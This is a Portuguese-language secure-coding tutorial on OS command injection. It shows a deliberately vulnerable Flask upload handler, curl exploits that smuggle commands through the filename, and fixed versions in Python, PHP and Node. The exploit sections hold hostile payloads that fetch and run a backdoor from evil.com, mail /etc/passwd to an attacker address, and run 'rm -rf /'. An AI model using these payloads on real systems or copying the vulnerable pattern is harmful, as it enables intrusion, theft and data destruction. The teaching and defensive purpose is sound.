# Code Examples: Execucao de Comandos do SO

## Exemplo 1: Aplicacao vulneravel completa (Flask)

```python
from flask import Flask, request
import os

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def upload():
    if request.method == "POST":
        file = request.files["file"]
        filename = file.filename  # VULNERAVEL: entrada do usuario!
        
        # Salva o arquivo original
        file.save(os.path.join("original", filename))
        
        # VULNERAVEL: filename vai direto para o comando do SO
        os.system(f"svgo original/{filename} -o optimized/{filename}")
        
        return f"Arquivo {filename} uploaded and optimized"
    
    return '''
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" accept=".svg">
        <button type="submit">Upload</button>
    </form>
    '''
```

## Exemplo 2: Exploit (script do atacante)

```bash
#!/bin/bash
# exploit.sh — demonstracao do instrutor

# Requisicao normal (copiada da aba Network)
curl -X POST http://localhost:5000/ \
  -F "file=@test.svg;filename=x.svg; date > hacker.txt;"

# Resultado: alem de processar o SVG, executa 'date > hacker.txt'
# O arquivo hacker.txt aparece no diretorio do servidor
```

### Exploits mais perigosos que o instrutor mencionou:

```bash
# Baixar e executar backdoor
curl -X POST http://localhost:5000/ \
  -F "file=@test.svg;filename=x.svg; wget http://evil.com/backdoor.sh; bash backdoor.sh;"

# Injetar codigo no proprio app.py
curl -X POST http://localhost:5000/ \
  -F "file=@test.svg;filename=x.svg; echo 'import os; os.system(\"rm -rf /\")' >> app.py;"
```

## Exemplo 3: Aplicacao corrigida (solucao do instrutor)

```python
from flask import Flask, request
import os
import secrets

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def upload():
    if request.method == "POST":
        file = request.files["file"]
        
        # SEGURO: nome gerado internamente, sem input do usuario
        filename = secrets.token_hex(8) + ".svg"
        
        file.save(os.path.join("original", filename))
        
        # SEGURO: filename nao vem do usuario
        os.system(f"svgo original/{filename} -o optimized/{filename}")
        
        return f"Arquivo {filename} uploaded and optimized"
    
    return '''
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" accept=".svg">
        <button type="submit">Upload</button>
    </form>
    '''
```

## Exemplo 4: Versao ainda mais segura (subprocess sem shell)

```python
import subprocess
import secrets
import os

def optimize_svg(file):
    filename = secrets.token_hex(8) + ".svg"
    original_path = os.path.join("original", filename)
    optimized_path = os.path.join("optimized", filename)
    
    file.save(original_path)
    
    # subprocess com lista de argumentos — nao passa pelo shell
    result = subprocess.run(
        ["svgo", original_path, "-o", optimized_path],
        capture_output=True,
        text=True,
        timeout=30  # evita processos pendurados
    )
    
    if result.returncode != 0:
        raise RuntimeError(f"SVGO falhou: {result.stderr}")
    
    return filename
```

## Exemplo 5: Quando o usuario PRECISA fornecer um parametro

```python
import re
import subprocess

def generate_theme(user_theme_name: str):
    # Validacao PARANOICA: apenas \w (letras, numeros, underline)
    if not re.fullmatch(r'\w{1,50}', user_theme_name):
        raise ValueError(
            "Nome do tema invalido. "
            "Use apenas letras, numeros e underline (max 50 caracteres)."
        )
    
    # Agora e seguro — sabemos que so contem [a-zA-Z0-9_]
    subprocess.run(
        ["generate-theme", "--name", user_theme_name],
        check=True
    )
```

## Exemplo 6: Alternativas de caracteres perigosos

```bash
# Todos estes separam/injetam comandos no shell:

# Ponto-e-virgula (separador)
filename="x.svg; rm -rf /"

# Ampersand (background + proximo comando)  
filename="x.svg & wget evil.com/backdoor.sh"

# Pipe (redireciona para outro comando)
filename="x.svg | mail attacker@evil.com < /etc/passwd"

# Command substitution com $()
filename="x.svg $(curl evil.com/backdoor.sh | bash)"

# Command substitution com backtick
filename="x.svg `curl evil.com/backdoor.sh | bash`"

# Por isso: whitelist \w+ e a UNICA validacao aceitavel
```

## Exemplo 7: Equivalentes em outras linguagens

### PHP (vulneravel vs seguro)

```php
// VULNERAVEL
$filename = $_FILES['file']['name'];
shell_exec("svgo original/$filename -o optimized/$filename");

// SEGURO
$filename = bin2hex(random_bytes(8)) . ".svg";
$escaped = escapeshellarg("original/$filename");
// Melhor ainda: usar biblioteca PHP para SVG
```

### Node.js (vulneravel vs seguro)

```javascript
// VULNERAVEL
const filename = req.file.originalname;
exec(`svgo original/${filename} -o optimized/${filename}`);

// SEGURO
const { randomBytes } = require('crypto');
const filename = randomBytes(8).toString('hex') + '.svg';
// execFile nao usa shell — argumentos sao passados diretamente
execFile('svgo', [`original/${filename}`, '-o', `optimized/${filename}`]);
```